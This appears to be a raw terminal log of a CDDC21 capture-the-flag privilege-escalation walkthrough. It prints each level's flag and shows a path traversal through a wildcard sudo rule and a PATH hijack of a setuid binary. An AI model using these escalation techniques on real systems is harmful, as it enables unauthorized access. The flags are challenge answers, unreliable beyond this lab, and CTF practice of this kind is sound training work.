@@ -1,0 +1,284 @@
+bot1@cybot01:~$ ls
+flag.txt
+bot1@cybot01:~$ cat flag.txt
+CDDC21{b0t_eNtR3nC3}
+bot1@cybot01:~$ su bot2
+Password:
+su: Authentication failure
+bot1@cybot01:~$ su bot2
+Password:
+bot2@cybot01:/home/bot1$ cd
+bot2@cybot01:~$ ls
+bot2@cybot01:~$ ls -la
+total 40
+dr-xr-x---  2 root bot2  4096 Jun 18 09:51  .
+-rwxrwxrwx  1 bot2 root 16752 Jun 18 09:51 '.#flag$!!1'
+drwxr-xr-x 10 root bot5  4096 Jun 18 09:51  ..
+lrwxrwxrwx  1 root root     9 Jun 18 09:51  .bash_history -> /dev/null
+-r--r-----  1 bot2 bot2   220 Feb 25  2020  .bash_logout
+-r--r-----  1 bot2 bot2  3771 Feb 25  2020  .bashrc
+-r--r-----  1 bot2 bot2   807 Feb 25  2020  .profile
+bot2@cybot01:~$
+bot2@cybot01:~$ ./.#flag\$\!\!1
+CDDC21{TH4nKsF0R_p3RM}
+bot2@cybot01:~$ su bot3
+Password:
+bot3@cybot01:/home/bot2$ cd
+bot3@cybot01:~$ ls -la
+total 24
+dr-xr-x---  2 root bot3 4096 Jun 18 09:51 .
+drwxr-xr-x 10 root bot5 4096 Jun 18 09:51 ..
+lrwxrwxrwx  1 root root    9 Jun 18 09:51 .bash_history -> /dev/null
+-r--r-----  1 bot3 bot3  220 Feb 25  2020 .bash_logout
+-r--r-----  1 bot3 bot3 3771 Feb 25  2020 .bashrc
+-r--r-----  1 bot3 bot3  807 Feb 25  2020 .profile
+-rwx--x--x  1 bot3 root  794 Jun 23 10:34 .viminfo
+bot3@cybot01:~$ vim .viminfo
+E575: viminfo: Illegal starting char in line: 1,4
+E575: viminfo: Illegal starting char in line: 2,0,1620820231,,"qa!"
+E575: viminfo: Illegal starting char in line: 4,48,1,15,1620820231,"/usr/local/share/secret'
+E575: viminfo: Illegal starting char in line: 4,39,1,15,1620820231,"/usr/local/share/secret'
+Press ENTER or type command to continue
+bot3@cybot01:~$ cat /usr/local/share/secret
+CDDC21{V1m_th3_s4vior}
+bot3@cybot01:~$ su bot4
+Password:
+bot4@cybot01:/home/bot3$ cd
+bot4@cybot01:~$ ls -la
+total 120
+dr-xr-x---  2 root bot4  4096 Jun 18 09:51 .
+drwxr-xr-x 10 root bot5  4096 Jun 18 09:51 ..
+lrwxrwxrwx  1 root root     9 Jun 18 09:51 .bash_history -> /dev/null
+-r--r-----  1 bot4 bot4   220 Feb 25  2020 .bash_logout
+-r--r-----  1 bot4 bot4  3771 Feb 25  2020 .bashrc
+-r--r-----  1 bot4 bot4   807 Feb 25  2020 .profile
+-rwxrwxrwx  1 bot4 root 99998 Jun 18 09:51 random-secrets
+bot4@cybot01:~$ cat random-secrets | grep CDDC
+CDDC21{gRe3EpL1nG}
+bot4@cybot01:~$ su bot5
+Password:
+bash: /home/bot5/.bashrc: Permission denied
+bot5@cybot01:/home/bot4$ cd
+bot5@cybot01:~$ ls -la
+total 24
+dr-xr-x---  2 root bot5 4096 Jun 18 09:51 .
+drwxr-xr-x 10 root bot5 4096 Jun 18 09:51 ..
+lrwxrwxrwx  1 root root    9 Jun 18 09:51 .bash_history -> /dev/null
+-rwx------  1 root bot5    1 Jun 23 11:08 .bash_logout
+-rwx------  1 root bot5  647 Jun 23 11:31 .bashrc
+-rwxrwxrwx  1 root bot5   24 Jun 24 08:37 .profile
+-r--------  1 bot6 root   22 Jun 18 09:51 flag.txt
+bot5@cybot01:~$ sudo -l
+Matching Defaults entries for bot5 on cybot01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bot5 may run the following commands on cybot01:
+    (bot6 : bot6) NOPASSWD: /usr/bin/cat /var/log/*
+bot5@cybot01:~$ sudo -u bot6 cat /var/log/../../home/bot5/flag.txt
+CDDC21{b3w4r3sud03rz}
+bot5@cybot01:~$ su bot6
+Password:
+bot6@cybot01:/home/bot5$ cd
+bot6@cybot01:~$ ls -la
+total 44
+dr-xr-x---  2 root bot6  4096 Jun 18 09:51 .
+drwxr-xr-x 10 root bot5  4096 Jun 18 09:51 ..
+lrwxrwxrwx  1 root root     9 Jun 18 09:51 .bash_history -> /dev/null
+-r--r-----  1 bot6 bot6   220 Feb 25  2020 .bash_logout
+-r--r-----  1 bot6 bot6  3771 Feb 25  2020 .bashrc
+-r--r-----  1 bot6 bot6   807 Feb 25  2020 .profile
+-r--------  1 bot7 root    31 Jun 18 09:51 flag.txt
+-r-sr-xr-x  1 bot7 root 17008 Jun 18 09:51 systeminfo
+bot6@cybot01:~$ ./systeminfo
+System information...
+
+[*] Date:
+Thu Jun 24 14:34:03 UTC 2021
+
+[*] Kernel:
+5.8.0-1035-aws
+
+[*] User infomation:
+uid=1007(bot7) gid=1006(bot6) groups=1006(bot6),1005(bot5)
+bot6@cybot01:~$ date
+Thu Jun 24 14:34:25 UTC 2021
+bot6@cybot01:~$ uname -r
+5.8.0-1035-aws
+bot6@cybot01:~$ id
+uid=1006(bot6) gid=1006(bot6) groups=1006(bot6),1005(bot5)
+bot6@cybot01:~$ strings systeminfo
+/lib64/ld-linux-x86-64.so.2
+PnvE
+libc.so.6
+fflush
+puts
+setreuid
+putchar
+printf
+stdout
+system
+sleep
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+System information
+[*] Date:
+/bin/date
+[*] Kernel:
+/bin/uname -r
+[*] User infomation:
+:*3$"
+GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8060
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+mission6.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+putchar@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+stdout@@GLIBC_2.2.5
+puts@@GLIBC_2.2.5
+_edata
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+fflush@@GLIBC_2.2.5
+setreuid@@GLIBC_2.2.5
+__bss_start
+main
+__TMC_END__
+_ITM_registerTMCloneTable
+sleep@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+
+#!/bin/bash
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+bot6@cybot01:~$ id
+uid=1006(bot6) gid=1006(bot6) groups=1006(bot6),1005(bot5)
+bot6@cybot01:~$ ls -la
+total 44
+dr-xr-x---  2 root bot6  4096 Jun 18 09:51 .
+drwxr-xr-x 10 root bot5  4096 Jun 18 09:51 ..
+lrwxrwxrwx  1 root root     9 Jun 18 09:51 .bash_history -> /dev/null
+-r--r-----  1 bot6 bot6   220 Feb 25  2020 .bash_logout
+-r--r-----  1 bot6 bot6  3771 Feb 25  2020 .bashrc
+-r--r-----  1 bot6 bot6   807 Feb 25  2020 .profile
+-r--------  1 bot7 root    31 Jun 18 09:51 flag.txt
+-r-sr-xr-x  1 bot7 root 17008 Jun 18 09:51 systeminfo
+bot6@cybot01:~$ ls /mtmp
+ls: cannot access '/mtmp': No such file or directory
+bot6@cybot01:~$ ls /tmp
+ls: cannot open directory '/tmp': Permission denied
+bot6@cybot01:~$ cd /
+bot6@cybot01:/$ ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Jun 23 07:31 .
+drwxr-xr-x  19 root root  4096 Jun 23 07:31 ..
+lrwxrwxrwx   1 root root     7 Apr 30 23:15 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 Jun 24 06:23 boot
+drwxr-xr-x  16 root root  3200 Jun 24 06:23 dev
+drwxr-xr-x  93 root root  4096 Jun 24 03:17 etc
+drwxr-xr-x  10 root bot5  4096 Jun 18 09:51 home
+lrwxrwxrwx   1 root root     7 Apr 30 23:15 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Apr 30 23:15 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Apr 30 23:15 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Apr 30 23:15 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 30 23:30 lost+found
+drwxr-xr-x   2 root root  4096 Apr 30 23:15 media
+drwxr-xr-x   2 root root  4096 Apr 30 23:15 mnt
+drwxr-xr-x   2 root root  4096 Apr 30 23:15 opt
+dr-xr-xr-x 456 root root     0 Jun 23 07:31 proc
+drwx------   7 root root  4096 Jun 23 07:32 root
+drwxr-xr-x  25 root root   920 Jun 24 14:34 run
+lrwxrwxrwx   1 root root     8 Apr 30 23:15 sbin -> usr/sbin
+drwxr-xr-x   7 root root  4096 Apr 30 23:36 snap
+drwxr-xr-x   2 root root  4096 Apr 30 23:15 srv
+dr-xr-xr-x  13 root root     0 Jun 23 07:31 sys
+drwxrwS-wt  16 root root  4096 Jun 24 14:31 tmp
+drwxr-xr-x  15 root root  4096 Apr 30 23:22 usr
+drwxr-xr-x  13 root root  4096 Apr 30 23:26 var
+bot6@cybot01:/$ cd tmp
+bot6@cybot01:/tmp$ ls
+ls: cannot open directory '.': Permission denied
+bot6@cybot01:/tmp$ mkdir hello4
+bot6@cybot01:/tmp$ cd hello4
+bot6@cybot01:/tmp/hello4$ ls -la
+total 8
+drwxrwsr-x  2 bot6 root 4096 Jun 24 14:35 .
+drwxrwS-wt 17 root root 4096 Jun 24 14:35 ..
+bot6@cybot01:/tmp/hello4$ vim id
+bot6@cybot01:/tmp/hello4$ chmod +x id
+bot6@cybot01:/tmp/hello4$ PATH=/tmp/hello/:$PATH
+bot6@cybot01:/tmp/hello4$ cd
+bot6@cybot01:~$ ./systeminfo
+System information...
+
+[*] Date:
+Thu Jun 24 14:36:23 UTC 2021
+
+[*] Kernel:
+5.8.0-1035-aws
+
+[*] User infomation:
+uid=1007(bot7) gid=1006(bot6) groups=1006(bot6),1005(bot5)
+bot6@cybot01:~$ id
+uid=1006(bot6) gid=1006(bot6) groups=1006(bot6),1005(bot5)
+bot6@cybot01:~$ PATH=/tmp/hello4/:$PATH
+bot6@cybot01:~$ ./systeminfo
+System information...
+
+[*] Date:
+Thu Jun 24 14:36:45 UTC 2021
+
+[*] Kernel:
+5.8.0-1035-aws
+
+[*] User infomation:
+CDDC21{SU!d_!s_Qu!Te_DngeRouS}
